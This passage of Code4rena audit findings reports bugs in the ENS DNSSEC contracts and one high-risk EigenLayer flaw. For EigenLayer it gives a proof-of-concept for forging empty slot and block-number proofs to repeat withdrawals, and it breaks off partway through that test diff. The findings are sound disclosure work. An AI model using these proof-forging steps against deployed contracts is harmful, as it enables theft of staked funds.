https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/EllipticCurve.sol#L386-L395   # Vulnerability details   ## Impact `EllipticCurve.validateSignature` might accepts invalid signatures because `rs[1] >= n` is valid for current implementation but in fact, they are invalid.  ## Proof of Concept `EllipticCurve.validateSignature` doesn't check if `rs[1] < n`. If we uncomment the following line, it will be good, but currently there is no validation about `rs[1] < n`.  ```solidity         if (rs[0] == 0 || rs[0] >= n || rs[1] == 0) {             // || rs[1] > lowSmax)             return false;         } ```  As a result, if `rs[1] >= n` and `(rs[0], rs[1] - n)` is a valid signature, `EllipticCurve.validateSignature` will accept `(rs[0], rs[1])` as a valid signature.  But in the original Elliptic Curve Digital Signature Algorithm, `rs[1] >= n` is invalid as you can see [here in wikipedia](https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm#:~:text=follows%20these%20steps%3A-,Verify%20that%20r%20and%20s%20are%20integers%20in,.%20If%20not%2C%20the%20signature%20is%20invalid.,-Calculate).   ## Tools Used Manual Review  ## Recommended Mitigation Steps We should add validation `rs[1] < n`.  ```solidity     function validateSignature(         bytes32 message,         uint256[2] memory rs,         uint256[2] memory Q     ) internal pure returns (bool) {         // To disambiguate between public key solutions, include comment below.  -      if (rs[0] == 0 || rs[0] >= n || rs[1] == 0) {   +      if (rs[0] == 0 || rs[0] >= n || rs[1] == 0 || rs[1] >= n) {              // || rs[1] > lowSmax)             return false;         } ```   "}, {"title": "The implementation of `EllipticCurve.addProj` has a problem", "html_url": "https://github.com/code-423n4/2023-04-ens-findings/issues/275", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-04-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/EllipticCurve.sol#L208-L242   # Vulnerability details   ## Impact The implementation of `EllipticCurve.addProj` has a problem, and even associative law does not hold. But `EllipticCurve` is safe from this default. `addProj` is used by `multiplyScalar`, so `validateSignature` depends on `addProj`, but `multiplyScalar` is safe from this because the calculation in `multiplyScalar` doesn't use the zero point `O` because `n` * 2 > `2^256`.  ## Proof of Concept The implementation of `EllipticCurve.addProj` has a problem.  If `P = (x0, y0, z0)` and `-P = (x1, y1, z1)`, `addProj(x0, y0, z0, x1, y1, z1)` returns `zeroProj()` for zero point `O`, which is `(0, 1, 0)`. The problem is `addProj(0, 1, 0, x2, y2, z2)` = `(0, 1, 0)`, instead of `(x2, y2, z2)`, so `addProj` might return wrong results during complicated calculations.  The following test will show associative law does not hold when we add `G * (n - 1)`, `G`, `G` using `addProj`.  ```solidity     function testAddProj() external pure {         (uint x0, uint y0) = multipleGeneratorByScalar(n-1); // G * (n - 1)          (uint tempX, uint tempY, uint tempZ) = addProj(x0, y0, 1, gx, gy, 1);         (uint x1, uint y1, uint z1) = addProj(tempX, tempY, tempZ, gx, gy, 1); // addProj(addProj(G*(n-1), G), G)          (tempX, tempY, tempZ) = addProj(gx, gy, 1, gx, gy, 1);         (uint x2, uint y2, uint z2) = addProj(x0, y0, 1, tempX, tempY, tempZ); // addProj(G*(n-1), addProj(G, G))          (uint a1, uint b1) = toAffinePoint(x1, y1, z1);         (uint a2, uint b2) = toAffinePoint(x2, y2, z2);          require(a2 == gx && b2 == gy, \"actual result is G\"); // G*(n-1) + G + G = G          require(a1 != a2 || b1 != b2, \"associative law does not hold\");     } ```   ## Tools Used Manual Review  ## Recommended Mitigation Steps For zero point `O`, `addProj` can return `(0, 0, 0)` instead of `(0, 1, 0)`.  ```solidity             } else {  -              return zeroProj();  +              return (0, 0, 0);             } ```"}, {"title": "EllipticCurve.isOnCurve returns false for x = 0 or x = p", "html_url": "https://github.com/code-423n4/2023-04-ens-findings/issues/273", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-04-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/EllipticCurve.sol#L137-L140   # Vulnerability details   ## Impact  `EllipticCurve.isOnCurve` returns `false` for `x` = 0, but there are valid points of `SECP256R1` whose `x` coordinate is 0. If those points are used for public key in `validateSignature`, `validateSignature` will returns false for valid signatures.  ## Proof of Concept  `EllipticCurve.isOnCurve` returns `false` for `x` = 0 or `x` = p.  ```solidity     function isOnCurve(uint256 x, uint256 y) internal pure returns (bool) {         if (0 == x || x == p || 0 == y || y == p) {             return false;         } ```  But `SECP256R1`, which is the curve used here, has a point whose `x` coordinate is 0. Let us say ``` y0 = 0x66485C780E2F83D72433BD5D84A06BB6541C2AF31DAE871728BF856A174F93F4 ```  `y0 * y0 % p = b`, so `(0, y0)` is on `SECP256R1`, and `(0, p - y0)` is also on `SECP256R1`.   These are valid points and there is no limitation about these points, so they can be used as public key, even though the probability to choose the corresponding private key is very low. For these valid public key points, `isOnCurve` will return false. In that case, `validateSignature` will return false for valid signatures. ```solidity         if (!isOnCurve(Q[0], Q[1])) {             return false;         } ```  I attached coded POC for `isOnCurve`, and we don't know the private key of `(0, y0)`, so I skipped writing for `validateSignature`. ```solidity     function testIsOnCurve() external pure {         uint x;         uint y = 0x66485C780E2F83D72433BD5D84A06BB6541C2AF31DAE871728BF856A174F93F4;         require(mulmod(y, y, p) == b, \"y^2 = b, so (0, y) is on the curve\");          uint256 LHS = mulmod(y, y, p); // y^2         uint256 RHS = mulmod(mulmod(x, x, p), x, p); // x^3          if (a != 0) {             RHS = addmod(RHS, mulmod(x, a, p), p); // x^3 + a*x         }         if (b != 0) {             RHS = addmod(RHS, b, p); // x^3 + a*x + b         }          require(LHS == RHS, \"double check - (0, y) is on the curve\");         require(!isOnCurve(0, y), \"isOnCurve(0, y) returns false\");     } ```  ## Tools Used Manual Review  ## Recommended Mitigation Steps We should remove validation about `x` in `isOnCurve`.  ```solidity function isOnCurve(uint256 x, uint256 y) internal pure returns (bool) {  -      if (0 == x || x == p || 0 == y || y == p) {  +      if (0 == y || y == p) {             return false; ``` "}, {"title": "Unintentionally register a non-relevant DSN name owner", "html_url": "https://github.com/code-423n4/2023-04-ens-findings/issues/198", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "selected for report", "sponsor confirmed", "M-05"], "target": "2023-04-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/DNSRegistrar.sol#L158   # Vulnerability details  ## Impact If a user proves and claims a DNS name using a wrong address format, it executes successfully without getting any error and the DNS name owner will be changed to a new unknown address. I considered this as medium severity, as it is high impact finding with low likelihood. Cause the person who owns the new address can take control of the ENS name and transfer its ownership to another account. But because if a person finds out, she can immediately replace the correct address, the probability of such an event is low.   ## Proof of Concept In the following scenario, I provided a value called `arbitrarybytes` which is 22 bytes and set it as the 'foo.test' DNS owner address. `proveAndClaim()` function will execute successfully. Finally, the owner of the ENS name would be the value set as `newOwner` which is the last 20 bytes (from the right) of the provided value in `arbitrarybytes`.   ```js     const arbitrarybytes= '0x9fD6E51AaD88f6f4CE6aB8827279CFFFb92266332265'     const newOwner= '0xe51Aad88f6F4CE6aB8827279cFFFB92266332265'     const proof = [       hexEncodeSignedSet(rootKeys(expiration, inception)),       hexEncodeSignedSet(testRrset('foo.test', arbitrarybytes)),     ]      await registrar.proveAndClaim(utils.hexEncodeName('foo.test'), proof, {       from: accounts[0],     })      assert.equal(await ens.owner(namehash.hash('foo.test')), newOwner) ``` ## Tools Used vscode ## Recommended Mitigation Steps To check the validity of the owner address, the code first checks for the prefix which must be `a=0x`, and second for the length of the address which should not be less than 20 bytes or 40 characters through `hexToAddress()` function. The length of the address can also be checked to not be larger than 40 characters. ```solidity  function hexToAddress(         bytes memory str,         uint256 idx,         uint256 lastIdx     ) internal pure returns (address, bool) {         if (lastIdx - idx < 40) return (address(0x0), false);         (bytes32 r, bool valid) = hexStringToBytes32(str, idx, lastIdx);         return (address(uint160(uint256(r))), valid);     } ```"}, {"title": "verifySignatureWithKey - wrong bit value of DNSKEY_FLAG_ZONEKEY", "html_url": "https://github.com/code-423n4/2023-04-ens-findings/issues/197", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-b", "primary issue", "QA (Quality Assurance)", "sponsor confirmed", "Q-25"], "target": "2023-04-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L32 https://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L312   # Vulnerability details  ## Impact  In RFC 4034, the section 2.1.1 states the following:      2.1.1.  The Flags Field      Bit 7 of the Flags field is the Zone Key flag.  If bit 7 has value 1,     then the DNSKEY record holds a DNS zone key, and the DNSKEY RR's     owner name MUST be the name of a zone.  If bit 7 has value 0, then     the DNSKEY record holds some other type of DNS public key and MUST     NOT be used to verify RRSIGs that cover RRsets.   The problem is that the function is using bit 8 to check for Zone Key Flag. It will always return false as it will not find the correct bit set in dnskey.flags (https://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L312)    ## Proof of Concept  The value of DNSKEY_FLAG_ZONEKEY is (https://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L32):       uint256 constant DNSKEY_FLAG_ZONEKEY = 0x100;  In binary format it becomes      bit numbers                             8 7654 3210       uint256 constant DNSKEY_FLAG_ZONEKEY -> 1 0000 0000  as shown above, bit 7 is not compared in the flag, rather bit 8.   ## Tools Used  Manual inspection  ## Recommended Mitigation Steps  To comply with RFC 4034, the DNSKEY_FLAG_ZONEKEY should be updated as follows:      uint256 constant DNSKEY_FLAG_ZONEKEY = 0x80; "}, {"title": "`validateSignature(...)` in `EllipticCurve` mixes up Jacobian and projective coordinates", "html_url": "https://github.com/code-423n4/2023-04-ens-findings/issues/180", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "M-06"], "target": "2023-04-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/EllipticCurve.sol#L415   # Vulnerability details  ## Impact Currently not exploitable because this bug is cancelled out by another issue (see my Gas report). If the other issue is fixed `validateSignature` will return completely incorrect values.  ## Details  In https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/EllipticCurve.sol#L415 `validateSignature` converts to affine coordinates from Jacobian coordinates, i.e. $X_a = X_j \\cdot (Z_j^{-1})^2$. However, the inputs from the previous computation https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnssec-oracle/algorithms/EllipticCurve.sol#L408 are actually projective coordinates and the correct conversion formula is $X_a = X_p \\cdot Z_p^{-1}$. This has been working so far only because the `EllipticCurve` performs a redundant chain of immediate conversions projective->affine->projective->affine and so during that last conversion $Z = 1$. Should the chain of redundant conversions be fixed, `validateSignature` will no longer work correctly.  ## Tools Used  Manual review  ## Recommended Mitigation Steps  To just fix this bug:  ```diff diff --git a/contracts/dnssec-oracle/algorithms/EllipticCurve.sol b/contracts/dnssec-oracle/algorithms/EllipticCurve.sol index 6861264..ea7e865 100644 --- a/contracts/dnssec-oracle/algorithms/EllipticCurve.sol +++ b/contracts/dnssec-oracle/algorithms/EllipticCurve.sol @@ -412,7 +412,7 @@ contract EllipticCurve {          }            uint256 Px = inverseMod(P[2], p); -        Px = mulmod(P[0], mulmod(Px, Px, p), p); +        Px = mulmod(P[0], Px, p);            return Px % n == rs[0];      }  ```  Or to fix this bug and optimize out the redundant conversions chain: ```diff diff --git a/contracts/dnssec-oracle/algorithms/EllipticCurve.sol b/contracts/dnssec-oracle/algorithms/EllipticCurve.sol index 6861264..8568be2 100644 --- a/contracts/dnssec-oracle/algorithms/EllipticCurve.sol +++ b/contracts/dnssec-oracle/algorithms/EllipticCurve.sol @@ -405,14 +405,13 @@ contract EllipticCurve {          uint256 sInv = inverseMod(rs[1], n);          (x1, y1) = multiplyScalar(gx, gy, mulmod(uint256(message), sInv, n));          (x2, y2) = multiplyScalar(Q[0], Q[1], mulmod(rs[0], sInv, n)); -        uint256[3] memory P = addAndReturnProjectivePoint(x1, y1, x2, y2); +        (uint256 Px,, uint256 Pz) = addProj(x1, y1, 1, x2, y2, 1);   -        if (P[2] == 0) { +        if (Pz == 0) {              return false;          }   -        uint256 Px = inverseMod(P[2], p); -        Px = mulmod(P[0], mulmod(Px, Px, p), p); +        Px = mulmod(Px, inverseMod(Pz, p), p);            return Px % n == rs[0];      } ```"}, {"title": "Missing recursive calls handling in `OffchainDNSResolver` CCIP-aware contract", "html_url": "https://github.com/code-423n4/2023-04-ens-findings/issues/124", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-07"], "target": "2023-04-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnsregistrar/OffchainDNSResolver.sol#L109-L113 https://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnsregistrar/OffchainDNSResolver.sol#L119   # Vulnerability details  The `resolveCallback` function from `OffchainDNSResolver` is used as part of the EIP-3668 standard to properly resolve DNS names using an off-chain gateway and validating RRsets against the DNSSEC oracle.   The issue is that the function lacks proper error handling, specifically, a try/catch block to properly bubble up `OffchainLookup` error from the `dnsresolver` extracted from the RRset. As the EIP specifies,  > When a CCIP-aware contract wishes to make a call to another contract, and the possibility exists that the callee may implement CCIP read, the calling contract MUST catch all `OffchainLookup` errors thrown by the callee, and revert with a different error if the `sender` field of the error does not match the callee address. > [...] > Where the possibility exists that a callee implements CCIP read, a CCIP-aware contract MUST NOT allow the default solidity behaviour of bubbling up reverts from nested calls.   ## Impact  As per the EIP, the result would be an OffchainLookup that looks valid to the client, as the sender field matches the address of the contract that was called, but does not execute correctly.   ## Proof of Concept  1. Client calls `OffchainDNSResolver.resolve`, which reverts with `OffchainLookup`, and prompts the client to execute `resolveCallback` after having fetched the necessary data from the `gatewayURL` 2. The RRset returned by the gateway contains a `dnsresolver` that is a CCIP-aware contract, and also supports the `IExtendedDNSResolver.resolve.selector` interface 3. Calling `IExtendedDNSResolver(dnsresolver).resolve(name,query,context);` could trigger another `OffchainLookup` error, but with a `sender` that does not match the `dnsresolver`, which would be just returned to the client without any modifications 4. As a result, the `sender` field would be incorrect as per the EIP   ## Tools Used  Manual review  ## Recommended Mitigation Steps  Use the [recommended example](https://eips.ethereum.org/EIPS/eip-3668#example-1) from the EIP in order to support nested lookups. "}, {"title": "OffchainDNSResolver Missing supportsInterface()", "html_url": "https://github.com/code-423n4/2023-04-ens-findings/issues/105", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-b", "primary issue", "QA (Quality Assurance)", "sponsor confirmed", "Q-37"], "target": "2023-04-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-ens/blob/45ea10bacb2a398e14d711fe28d1738271cd7640/contracts/dnsregistrar/OffchainDNSResolver.sol#L32   # Vulnerability details  ## Impact Lack of implementation of `ERC165`, logic may be incorrect when `OffchainDNSResolver` is used elsewhere in the protocol and needs to determine if it is an `IExtendedResolver`, e.g. `UniversalResolver.sol`   ## Proof of Concept  The current implementation of `OffchainDNSResolver` only implements the interface `is IExtendedResolver`, but does not method `supportsInterface()`.  Since there is no `supportsInterface()` In the protocol, if you need to determine whether the contract `is IExtendedResolver`,  you will get an error result  Example: `UniversalResolver.sol`  ```solidity     function _hasExtendedResolver(         address resolver     ) internal view returns (bool) {         try             Resolver(resolver).supportsInterface{gas: 50000}(                 type(IExtendedResolver).interfaceId             )         returns (bool supported) {             return supported;         } catch {             return false;         }     } ```  Need to add `IERC165` to implement  ## Tools Used  ## Recommended Mitigation Steps  ```solidity - contract OffchainDNSResolver is IExtendedResolver { + contract OffchainDNSResolver is IExtendedResolver, IERC165 {   +    function supportsInterface( +        bytes4 interfaceID +    ) external pure override returns (bool) { +        return +            interfaceID == type(IERC165).interfaceId || +            interfaceID == type(IExtendedResolver).interfaceId; +    }  ```"}, {"title": "DNS wildcards are treated as valid labels ", "html_url": "https://github.com/code-423n4/2023-04-ens-findings/issues/92", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-04-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L19-L20 https://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L17   # Vulnerability details  ## Impact  Currently there are no restrictions on registry, validation of domain names that contain DNS wildcards: e.g. `*.amazon.eth`.  Protocol currently does not validated the canonical form of the name:  https://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L19-L20 ```  *       - Canonical form of names is not checked; in ENS this is done on the frontend, so submitting  *         proofs with non-canonical names will only result in registering unresolvable ENS names. ```  Although invalid, unresolvable ENS names, are not something new, these particular cases with wildcards will have an impact down the line if ever ENS extends to support wildcards  https://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L17 ```Solidity  *       - Proofs involving wildcard names will not validate. ```  ## Proof of Concept  An example POC + helper in validating an ENS with a wildcard, to be added in `TestOffchainDNSResolver.js`. Original test name utility normalizes name, as mimicking off-chain front-end validations.  ```Javascript   const sha3 = require('js-sha3').keccak_256   const uts46 = require('idna-uts46-hx')    const namehashNoDiscardUnicode = (inputName) => {     // Reject empty names:     let node = ''     for (let i = 0; i < 32; i++) {       node += '00'     }      name =name ? uts46.toUnicode(inputName, {transitional: false}) : inputName;     if (name) {       let labels = name.split('.')        for(var i = labels.length - 1; i >= 0; i--) {         let labelSha = sha3(labels[i])         node = sha3(new Buffer(node + labelSha, 'hex'))       }     }      return '0x' + node   }    it('DNS * wildcards are wrongly validated', async function () {     // Configure dnsresolver.eth to resolve to the ownedResolver so we can use it in the test     await root.setSubnodeOwner(ethers.utils.id('eth'), accounts[0])     await ens.setSubnodeOwner(       namehash.hash('eth'),       ethers.utils.id('dnsresolver'),       accounts[0],     )     await ens.setResolver(       namehash.hash('dnsresolver.eth'),       ownedResolver.address,     )     await ownedResolver.setAddr(       namehash.hash('dnsresolver.eth'),       ownedResolver.address,     )      const name = \"*.amazon.eth\";     const testAddress = '0xfefeFEFeFEFEFEFEFeFefefefefeFEfEfefefEfe'     await ownedResolver.setAddr(namehashNoDiscardUnicode(name), testAddress)     const pr = await PublicResolver.at(offchainResolver.address)     const callData = pr.contract.methods['addr(bytes32)'](       namehashNoDiscardUnicode(name),     ).encodeABI()     const result = await doResolveCallback(       name,       [`ENS1 dnsresolver.eth`],       callData,     )     expect(       ethers.utils.defaultAbiCoder.decode(['address'], result)[0],     ).to.equal(testAddress)   })  ```  ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  Identify if any names were registered with wildcards up to this point. - If none were, add constraints to existing code base to disallow this (checking for \"*\"). - If domains do exist, this corner case must be taken into consideration in any future resolver/validator/ as to not cause unforeseen circumstances."}, {"title": "`DNSSECImpl.sol#verifyKeyWithDS` can only use the first keyname", "html_url": "https://github.com/code-423n4/2023-04-ens-findings/issues/91", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-b", "primary issue", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-40"], "target": "2023-04-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L382-L384   # Vulnerability details  ## Impact  ```solidity File: dnssec-oracle/DNSSECImpl.sol 373     function verifyKeyWithDS( 374         bytes memory keyname, 375         RRUtils.RRIterator memory dsrrs, 376         RRUtils.DNSKEY memory dnskey, 377         bytes memory keyrdata 378     ) internal view returns (bool) { 379         uint16 keytag = keyrdata.computeKeytag(); 380         for (; !dsrrs.done(); dsrrs.next()) { 381             bytes memory proofName = dsrrs.name(); 382 1>          if (!proofName.equals(keyname)) { 383 1>              revert ProofNameMismatch(keyname, proofName); 384 1>          } ```  The `verifyKeyWithDS` function matches the `keyname` with the keys in `dsrrs`. `dsrrs` is obtained from `anchors` and is a set of keys. As long as keyrdata matches one of the keys is valid. `dsrrs` contains some keys, the names of these keys may be different, so when the comparison fails in line 382, it should find the next key for comparison instead of directly reverting.  May make some keys in `anchors` unusable. And same problem here: https://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L262-L264  ## Proof of Concept  1. There are two keys in the anchors, the keynames are `rootkey1` and `rootkey2` 2. When the user enters the public key `pubkeyA` issued by `rootkey2`, when `pubkeyA` and `rootkey1` compare the keyname, revert will occur directly instead of continuing to compare `rootkey2`  ## Tools Used  Manual  ## Recommended Mitigation Steps  ```diff      function verifyKeyWithDS(          bytes memory keyname,          RRUtils.RRIterator memory dsrrs,          RRUtils.DNSKEY memory dnskey,          bytes memory keyrdata      ) internal view returns (bool) {          uint16 keytag = keyrdata.computeKeytag();          for (; !dsrrs.done(); dsrrs.next()) {              bytes memory proofName = dsrrs.name();              if (!proofName.equals(keyname)) { -                revert ProofNameMismatch(keyname, proofName); +                continue;              } ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-04-ens-findings/issues/49", "labels": ["bug", "grade-b", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-31"], "target": "2023-04-ens-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-04-ens-findings/blob/main/data/chaduke-Q.md)."}, {"title": "Slot and block number proofs not required for verification of withdrawal (multiple withdrawals possible)", "html_url": "https://github.com/code-423n4/2023-04-eigenlayer-findings/issues/388", "labels": ["bug", "3 (High Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-04-eigenlayer-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/Merkle.sol#L80-L87 https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/BeaconChainProofs.sol#L245-L295 https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L305-L359   # Vulnerability details  ## Impact Since this is a vulnerability which involves multiple in-scope contracts and leads to more than one impact, let's start with a bug desciption from bottom to top.  ### Library `Merkle` The methods [verifyInclusionSha256(proof, root, leaf, index)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/Merkle.sol#L80-L87) and [verifyInclusionKeccak(proof, root, leaf, index)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/Merkle.sol#L29-L36) will **always** return `true` if `proof.lenght < 32` (e.g. empty proof) **and** `leaf == root`. Although this might be intended behaviour, I see no use case for empty proofs and would `require` non-empty proofs at library level. As of now, the user of the library is **responsible** to enforce non-zero proofs.  ### Library `BeaconChainProofs` The method [verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/BeaconChainProofs.sol#L245-L295), which relies on multiple calls to [Merkle.verifyInclusionSha256(proof, root, leaf, index)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/Merkle.sol#L80-L87), does not `require` a minimum length of `proofs.slotProof` and `proofs.blockNumberProof`. As a consequence, considering a valid set of `(beaconStateRoot, proofs, withdrawalFields)`, the method will still succeed with **empty** slot and block number proofs, i.e. the `proofs` can be modified in the following way: ```solidity proofs.slotProof = bytes(\"\");             // empty slot proof proofs.slotRoot = proofs.blockHeaderRoot; // make leaf == root  proofs.blockNumberProof = bytes(\"\");                  // empty block number proof proofs.blockNumberRoot = proofs.executionPayloadRoot; // make leaf == root ``` As a consequence, we can take a perfectly valid withdrawal proof and re-create the proof for the same withdrawal with a **different** slot and block number (according to the code above) that will still be accepted by the [verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/BeaconChainProofs.sol#L245-L295) method.  ### Contract `EigenPod` The method [verifyAndProcessWithdrawal(withdrawalProofs, ...)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L305-L359), which relies on a call to [BeaconChainProofs.verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/BeaconChainProofs.sol#L245-L295), is impacted by a modified - but still valid - withdrawal proof in two ways.    **First**, the modifier [proofIsForValidBlockNumber(Endian.fromLittleEndianUint64(withdrawalProofs.blockNumberRoot))](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L325) makes sure that the **block number** being proven is greater/newer than the `mostRecentWithdrawalBlockNumber`. In our case, `blockNumberRoot = executionPayloadRoot` and depending on the actual value of `executionPayloadRoot`, the `proofIsForValidBlockNumber` can be bypassed as shown in the test, see any PoC test case. As a consquence, old withdrawal proofs could be re-used with an empty `blockNumberProof` to withdraw the same funds more than once.  **Second**, the sub-method [_processPartialWithdrawal(withdrawalHappenedSlot, ...)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L422-L430) requires that a **slot** is only used once. In our case, `slotRoot = blockHeaderRoot` which leads to a [different slot](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L347) than suggested by the original proof, therefore a withdrawal proof can be re-used with an empty `slotProof` to do the same partial withdrawal twice, see PoC.   Depending on the actual value of `blockHeaderRoot`, a full withdrawal instead of a partial withdrawal will be done according to the [condition in L354](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L354).  ### Impact summary Insufficient validation of proofs allows multiple withdrawals, i.e. theft of funds.  ## Proof of Concept  The changes to the `EigenPod` test cases below demonstrate the following outcomes:   **testFullWithdrawalProof:** [BeaconChainProofs.verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/BeaconChainProofs.sol#L245-L295) still succeeds on empty slot and block number proofs.   **testFullWithdrawalFlow:** [EigenPod.verifyAndProcessWithdrawal(withdrawalProofs, ...)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L305-L359) allows full withdrawal with empty slot and block number proofs.   **testPartialWithdrawalFlow:** [EigenPod.verifyAndProcessWithdrawal(withdrawalProofs, ...)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L305-L359) allows partial withdrawal with empty slot and block number proofs.   **testProvingMultipleWithdrawalsForSameSlot:** [EigenPod.verifyAndProcessWithdrawal(withdrawalProofs, ...)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L305-L359) allows partial withdrawal of the same funds twice due to different `slotRoot` in original and modified proof.   *The [proofIsForValidBlockNumber(Endian.fromLittleEndianUint64(withdrawalProofs.blockNumberRoot))](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L325) modifier is bypassed (see `blockNumberRoot`) in the latter three of the above test cases.*    Apply the following *diff* to your `src/test/EigenPod.t.sol` and run the tests with `forge test --match-contract EigenPod`: ```diff diff --git a/src/test/EigenPod.t.sol b/src/test/EigenPod.t.sol index 31e6a58..5242def 100644 --- a/src/test/EigenPod.t.sol +++ b/src/test/EigenPod.t.sol @@ -260,7 +260,7 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {       function testFullWithdrawalProof() public {          setJSON(\"./src/test/test-data/fullWithdrawalProof.json\"); -        BeaconChainProofs.WithdrawalProofs memory proofs = _getWithdrawalProof(); +        BeaconChainProofs.WithdrawalProofs memory proofs = _getWithdrawalProof(SKIP_SLOT_BLOCK_PROOF);          withdrawalFields = getWithdrawalFields();          validatorFields = getValidatorFields();  @@ -281,7 +281,7 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {           // ./solidityProofGen \"WithdrawalFieldsProof\" 61336 2262 \"data/slot_43222/oracle_capella_beacon_state_43300.ssz\" \"data/slot_43222/capella_block_header_43222.json\" \"data/slot_43222/capella_block_43222.json\" fullWithdrawalProof.json          setJSON(\"./src/test/test-data/fullWithdrawalProof.json\"); -        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(); +        